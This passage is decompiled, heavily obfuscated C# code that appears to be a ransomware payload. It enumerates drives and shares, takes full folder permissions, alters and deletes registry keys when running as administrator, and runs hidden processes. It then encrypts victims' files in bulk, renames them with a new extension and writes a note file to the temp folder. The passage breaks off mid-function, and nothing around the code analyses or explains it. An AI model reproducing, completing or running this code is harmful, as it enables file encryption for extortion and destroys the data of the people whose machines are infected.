			bksiKRlToNsI.XIcMBLeICLrfP xIcMBLeICLrfP = new bksiKRlToNsI.XIcMBLeICLrfP(bksiKRlToNsI.UdoguuIsTpiX.LqFxtPCChcgDy, bksiKRlToNsI.JVLOWTTxfSVd.zEbwsNcGcurJS, bksiKRlToNsI.nrmagkVZFkNvUV.AkykNRdLLPoK, bksiKRlToNsI.lSmwsLTeQWh.hAFZRcXGumqsP);
			foreach (string item3 in xIcMBLeICLrfP)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107388349));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (bCrEAAPvBiMx == getString_0(107397210))
						{
							for (int j = 0; j < bksiKRlToNsI.YruVSpqbZI.Count; j++)
							{
								YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388300) + item4.ToString() + getString_0(107388291) + bksiKRlToNsI.YruVSpqbZI[j] + getString_0(107388386) + bksiKRlToNsI.DGrMJBvIrlFsyO[j]);
							}
						}
						else
						{
							YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388300) + item4.ToString() + getString_0(107388453));
						}
					}
					catch
					{
					}
					if (!lrbABqBtwmdm.Contains(item4.ToString()))
					{
						lrbABqBtwmdm.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			List<string> list2 = JMLcAoNnCKdXe();
			foreach (string item5 in list2)
			{
				if (item5.Contains(getString_0(107387734)) || item5.Contains(getString_0(107387729)) || item5.Contains(getString_0(107387752)) || item5.Contains(getString_0(107387743)) || item5.Contains(getString_0(107387702)) || item5.Contains(getString_0(107387725)) || item5.Contains(getString_0(107387712)) || item5.Contains(getString_0(107387691)) || item5.ToLower().Contains(getString_0(107388528)) || item5.ToLower().Contains(getString_0(107388547)) || item5.Contains(getString_0(107387662)) || item5.Contains(getString_0(107387609)) || item5.ToLower().Contains(getString_0(107388996)) || item5.ToLower().Contains(getString_0(107388951)) || item5.ToLower().Contains(getString_0(107388914)) || item5.ToLower().Contains(getString_0(107388937)) || item5.ToLower().Contains(getString_0(107388888)) || item5.ToLower().Contains(getString_0(107388862)) || item5.ToLower().Contains(getString_0(107388873)))
				{
					continue;
				}
				try
				{
					if (bCrEAAPvBiMx == getString_0(107397210))
					{
						for (int k = 0; k < bksiKRlToNsI.YruVSpqbZI.Count; k++)
						{
							YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388300) + item5 + getString_0(107388291) + bksiKRlToNsI.YruVSpqbZI[k] + getString_0(107388386) + bksiKRlToNsI.DGrMJBvIrlFsyO[k]);
						}
					}
					else
					{
						YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388300) + item5 + getString_0(107388453));
					}
				}
				catch
				{
				}
				if (!lrbABqBtwmdm.Contains(item5))
				{
					lrbABqBtwmdm.Add(item5);
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = iIncmAQQCyiqzep(getString_0(107387628));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VrSebPGaWq(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(VrSebPGaWq(getString_0(107387523)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(VrSebPGaWq(getString_0(107387978)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (XoytfIUFESAvwmbb == getString_0(107397210))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107387901), getString_0(107387892));
				File.WriteAllText(text, VrSebPGaWq(getString_0(107387915)), Encoding.ASCII);
				YIXLlGdULNfSbR(getString_0(107397127), getString_0(107386829) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107386824))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107386824)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107386815))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107386815)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107386774));
		ManagementObjectEnumerator enumerator6 = val.Get().GetEnumerator();
		try
		{
			while (enumerator6.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator6.get_Current();
				if (!lrbABqBtwmdm.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388458), getString_0(107397132)).Replace(getString_0(107386753), getString_0(107388458))
					.Replace(getString_0(107388453), getString_0(107389383))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					lrbABqBtwmdm.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388458), getString_0(107397132)).Replace(getString_0(107386753), getString_0(107388458))
						.Replace(getString_0(107388453), getString_0(107389383))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387702), getString_0(107389383)) + getString_0(107386200));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator6)?.Dispose();
		}
	}

	public static void JIJxgqGiTDGj(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = VrSebPGaWq(getString_0(107386191));
		processStartInfo.Arguments = getString_0(107386162) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool CHNqSdIclpz(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string LqlpLVDdUP(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void DKRPhjgMiUiA()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = iIncmAQQCyiqzep(getString_0(107386189));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VrSebPGaWq(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386051)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386026)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107385977)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107385984)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386191)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386471)));
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386442)));
					registryKey.Close();
				}
				string_ = iIncmAQQCyiqzep(getString_0(107386393));
				registryKey = Registry.LocalMachine.OpenSubKey(VrSebPGaWq(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386296)));
					registryKey.Close();
				}
				string_ = iIncmAQQCyiqzep(getString_0(107386311));
				registryKey = Registry.LocalMachine.OpenSubKey(VrSebPGaWq(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386296)));
					registryKey.Close();
				}
				string_ = iIncmAQQCyiqzep(getString_0(107386311));
				registryKey = Registry.CurrentUser.OpenSubKey(VrSebPGaWq(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VrSebPGaWq(getString_0(107386296)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107386262)), VrSebPGaWq(getString_0(107386277)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107385684)), VrSebPGaWq(getString_0(107385707)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107385684)), VrSebPGaWq(getString_0(107385529)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107385468)), VrSebPGaWq(getString_0(107385483)));
		}
		catch
		{
		}
	}

	public static void lOMKHaCMphu(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(VrSebPGaWq(getString_0(107385922)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void xizWMiNBHKcp()
	{
		string string_ = iIncmAQQCyiqzep(getString_0(107385897));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VrSebPGaWq(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(VrSebPGaWq(getString_0(107385784)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void QtQRYhdehvUXbk()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107396440)), VrSebPGaWq(getString_0(107396459)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107396440)), VrSebPGaWq(getString_0(107385751)));
		}
	}

	public static void sYQQGplgMYk()
	{
		YIXLlGdULNfSbR(getString_0(107397127), VrSebPGaWq(getString_0(107385125)));
		string text = VrSebPGaWq(getString_0(107385443));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388453) + text + getString_0(107388453) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397127);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void DipEOSYYYUSt(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(DFeZKWhzZEN, getString_0(107385378) + string_0 + getString_0(107385337) + ex.Message + getString_0(107396588));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string ASbXtPMgHzag()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389383);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107385280);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107385271))) ? getString_0(107385285) : getString_0(107385294));
				break;
			case 0:
				text = getString_0(107385276);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107385243);
				break;
			case 4:
				text = getString_0(107385262);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107385212) : getString_0(107385253));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107385220) : getString_0(107385225)) : getString_0(107385230)) : getString_0(107385207));
				break;
			case 10:
				text = getString_0(107385215);
				break;
			}
		}
		if (text != getString_0(107389383))
		{
			text = getString_0(107384666) + text;
			if (oSVersion.ServicePack != getString_0(107389383))
			{
				text = text + getString_0(107388386) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string COpkimzmDiT(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395625);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(VrSebPGaWq(getString_0(107395592)));
				streamWriter.WriteLine(getString_0(107396588));
				streamWriter.WriteLine(VrSebPGaWq(getString_0(107392986)));
				streamWriter.WriteLine(string_0);
				if (HITrlhSdkRhVnTG)
				{
					streamWriter.WriteLine(getString_0(107396588));
					streamWriter.WriteLine(VrSebPGaWq(getString_0(107392908)));
					streamWriter.WriteLine(JVNsUrWNTuwEu.PpPaxJIRqdB());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !OGOvpjxWqYzkk)
				{
					File.AppendAllText(text, getString_0(107392363) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(DFeZKWhzZEN, getString_0(107384685) + ex.Message + getString_0(107396588));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void TkTXfdYgVXas(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		dKFlEjeuaGmF.HQfrsIQrOMUPAw CS_0024_003C_003E8__locals0 = new dKFlEjeuaGmF();
		CS_0024_003C_003E8__locals0.CFydVPUKSVwwfR = string_1;
		CS_0024_003C_003E8__locals0.bsNROZsFSfpd = string_2;
		CS_0024_003C_003E8__locals0.pRUTpPeXmJ = string_3;
		CS_0024_003C_003E8__locals0.HgEhetuptAI = string_4;
		iJULqxXSwKAXP = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pRUTpPeXmJ);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107384596))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !lrbABqBtwmdm.Contains(array[i].Name))
					{
						lrbABqBtwmdm.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!lrbABqBtwmdm.Contains(string_0[j]))
				{
					lrbABqBtwmdm.Add(string_0[j]);
				}
			}
		}
		if (lrbABqBtwmdm.Contains(VrSebPGaWq(getString_0(107384619))) && JhAPsHLAMSzl == getString_0(107397210))
		{
			lrbABqBtwmdm.Remove(VrSebPGaWq(getString_0(107384619)));
		}
		Parallel.ForEach(lrbABqBtwmdm, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new dKFlEjeuaGmF.HQfrsIQrOMUPAw();
			CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.uxZFQGzScS = string_0;
			if (NlpTotdSTrdumik && !ASbXtPMgHzag().Contains(dKFlEjeuaGmF.getString_0(107385221)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CHNqSdIclpz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.uxZFQGzScS);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (kzoXfhpDPa == dKFlEjeuaGmF.getString_0(107397219))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SXrhZQJaTUl(CS_0024_003C_003E8__locals0.uxZFQGzScS, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.CFydVPUKSVwwfR, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.HgEhetuptAI, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.bsNROZsFSfpd, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.pRUTpPeXmJ);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SXrhZQJaTUl(CS_0024_003C_003E8__locals0.uxZFQGzScS, CS_0024_003C_003E8__locals0.CFydVPUKSVwwfR, CS_0024_003C_003E8__locals0.HgEhetuptAI, CS_0024_003C_003E8__locals0.bsNROZsFSfpd, CS_0024_003C_003E8__locals0.pRUTpPeXmJ);
			}
		});
	}

	public static void SXrhZQJaTUl(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389383));
		List<string> list3 = list2;
		if (MhTWjAitsIWp == getString_0(107396735))
		{
			list = fOaFHBRQre(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = rHbafUcUytwV.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((rnIsguQhwxo == getString_0(107396735) && !item.EndsWith(text)) || tYmlquEGMxfHN.Contains(item))
				{
					continue;
				}
				if (WlLLAxxAchpN == getString_0(107397210))
				{
					try
					{
						if (IVJqAYyIRPoOgC.SaxwKwUNxFPLf(item))
						{
							IVJqAYyIRPoOgC.KNsoUXkaLTo(item);
						}
					}
					catch
					{
					}
				}
				tYmlquEGMxfHN.Add(item);
				if (!GjyUHzrKYHxXFV.Contains(Path.GetDirectoryName(item)))
				{
					GjyUHzrKYHxXFV.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CIfLKSlioN == getString_0(107397210) && fileStream.Length > Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024 && !list3.Contains(text))
					{
						if (ZsMYnZdnVwqV == getString_0(107397210))
						{
							foreach (string item2 in reXUufgXsSe)
							{
								if (item.ToLower().EndsWith(item2) && qgDONLtRygbsG == getString_0(107397210))
								{
									if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && qgDONLtRygbsG == getString_0(107396735))
								{
									try
									{
										JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = xDMypKOxUD.DGMRcCHBjFbxJ(item, Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024);
						byte[] aZdtlXlIbCEFkk = xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						xDMypKOxUD.PerouGeIvmxU(item, aZdtlXlIbCEFkk);
						if (string_2 != getString_0(107384610))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107384610))
					{
						GMTuCGZfmCQ(item, item + string_2, iJULqxXSwKAXP);
					}
					else
					{
						GMTuCGZfmCQ(item, item + getString_0(107384573), iJULqxXSwKAXP);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void kTlfEAxiydfET(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		NxhNWBJwtfUuM.UPxHIfYdmYP CS_0024_003C_003E8__locals0 = new NxhNWBJwtfUuM();
		CS_0024_003C_003E8__locals0.BdJvEtGXFodrl = list_0;
		CS_0024_003C_003E8__locals0.HIDOumbCVkTws = string_1;
		CS_0024_003C_003E8__locals0.yAYIsTKmrizA = string_2;
		CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ = string_3;
		CS_0024_003C_003E8__locals0.oVWAGhnvYra = new List<string> { getString_0(107389383) };
		if (rnIsguQhwxo == getString_0(107396735))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.BdJvEtGXFodrl)
				{
					if (CS_0024_003C_003E8__locals0.yAYIsTKmrizA.Length != 0)
					{
						string[] yAYIsTKmrizA2 = CS_0024_003C_003E8__locals0.yAYIsTKmrizA;
						int num2 = 0;
						while (num2 < yAYIsTKmrizA2.Length)
						{
							string value2 = yAYIsTKmrizA2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_078a;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.HIDOumbCVkTws))
						{
							goto IL_078a;
						}
					}
					catch (Exception)
					{
						goto IL_078a;
					}
					if (item.EndsWith(string_0) && !tYmlquEGMxfHN.Contains(item))
					{
						if (WlLLAxxAchpN == NxhNWBJwtfUuM.getString_0(107397227))
						{
							try
							{
								if (IVJqAYyIRPoOgC.SaxwKwUNxFPLf(item))
								{
									IVJqAYyIRPoOgC.KNsoUXkaLTo(item);
								}
							}
							catch
							{
							}
						}
						tYmlquEGMxfHN.Add(item);
						if (!GjyUHzrKYHxXFV.Contains(Path.GetDirectoryName(item)))
						{
							GjyUHzrKYHxXFV.Add(Path.GetDirectoryName(item));
						}
						DipEOSYYYUSt(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (sfIQAmNvQu)
								{
									try
									{
										File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + item + NxhNWBJwtfUuM.getString_0(107402069) + ex12.Message + NxhNWBJwtfUuM.getString_0(107396605));
									}
									catch (Exception)
									{
									}
								}
								OePGqyfYpLiYf++;
								goto end_IL_00ee_2;
							}
							if (CIfLKSlioN == NxhNWBJwtfUuM.getString_0(107397227) && new FileInfo(item).Length > Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.oVWAGhnvYra.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new NxhNWBJwtfUuM.GKKjkBoNtCxNXx();
								CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
									{
										if (HITrlhSdkRhVnTG)
										{
											CS_0024_003C_003E8__locals0.HIDOumbCVkTws = cIqGLYlhSzE + CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws);
									}
								}
								catch (Exception ex14)
								{
									if (sfIQAmNvQu)
									{
										try
										{
											File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + item + NxhNWBJwtfUuM.getString_0(107402008) + ex14.Message + NxhNWBJwtfUuM.getString_0(107396605));
										}
										catch (Exception)
										{
										}
									}
									OePGqyfYpLiYf++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.BrVGKZEEUR = NxhNWBJwtfUuM.getString_0(107389400);
								if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
								{
									CS_0024_003C_003E8__locals0.BrVGKZEEUR = item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
								}
								else
								{
									CS_0024_003C_003E8__locals0.BrVGKZEEUR = item;
								}
								if (ZsMYnZdnVwqV == NxhNWBJwtfUuM.getString_0(107397227))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in reXUufgXsSe)
										{
											if (CS_0024_003C_003E8__locals0.BrVGKZEEUR.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107397230))
											{
												if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BrVGKZEEUR).Length)
												{
													try
													{
														JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389452), NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389447), NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389466), CS_0024_003C_003E8__locals0.BrVGKZEEUR);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.BrVGKZEEUR.ToLower().EndsWith(item2) && qgDONLtRygbsG == NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107396755))
											{
												try
												{
													JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389452), NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389447), NxhNWBJwtfUuM.GKKjkBoNtCxNXx.getString_0(107389466), CS_0024_003C_003E8__locals0.BrVGKZEEUR);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = eLIwgixNfmLC.ChftDwvmoj(32);
								string s3 = uNKhrFAtKoRBVa.EnHLHyVjWIb(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (MrvhpQshaKLQlY == NxhNWBJwtfUuM.getString_0(107396752))
								{
									byte[] array2 = null;
									byte[] byte_2 = xDMypKOxUD.DGMRcCHBjFbxJ(CS_0024_003C_003E8__locals0.BrVGKZEEUR, Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024);
									xDMypKOxUD.PerouGeIvmxU(AZdtlXlIbCEFkk: (!DseMmyGrBoOjezM) ? (OGOvpjxWqYzkk ? xDMypKOxUD.EmzieFXgUGooI(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xDMypKOxUD.EmzieFXgUGooI(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OGOvpjxWqYzkk ? RfklKQbYsGtli.zKFUoKSoRuLY(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RfklKQbYsGtli.zKFUoKSoRuLY(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), SDWAgRRAQsnxQ: CS_0024_003C_003E8__locals0.BrVGKZEEUR, BbOGTxvaLAuDcV: bytes3);
								}
								else if (!OGOvpjxWqYzkk)
								{
									bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.BrVGKZEEUR, mztBYJzvvrZxTt, CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ);
								}
								else
								{
									bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.BrVGKZEEUR, mztBYJzvvrZxTt, text3, bytes3);
								}
							}
							else
							{
								if (HITrlhSdkRhVnTG)
								{
									CS_0024_003C_003E8__locals0.HIDOumbCVkTws = cIqGLYlhSzE + CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
								}
								string text4 = eLIwgixNfmLC.ChftDwvmoj(32);
								string s4 = uNKhrFAtKoRBVa.EnHLHyVjWIb(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
								{
									if (!ucaWVFkBOPmIjDGYC)
									{
										if (!OGOvpjxWqYzkk)
										{
											rOJiIraMDUnH(item, item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, iJULqxXSwKAXP);
										}
										else
										{
											rOJiIraMDUnH(item, item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!OGOvpjxWqYzkk)
											{
												TAoAasJVXJBG(item, item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, iJULqxXSwKAXP);
											}
											else
											{
												TAoAasJVXJBG(item, item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (sfIQAmNvQu)
											{
												try
												{
													File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + item + NxhNWBJwtfUuM.getString_0(107384581) + ex16.Message + NxhNWBJwtfUuM.getString_0(107396605));
												}
												catch (Exception)
												{
												}
											}
											OePGqyfYpLiYf++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!ucaWVFkBOPmIjDGYC)
								{
									if (!OGOvpjxWqYzkk)
									{
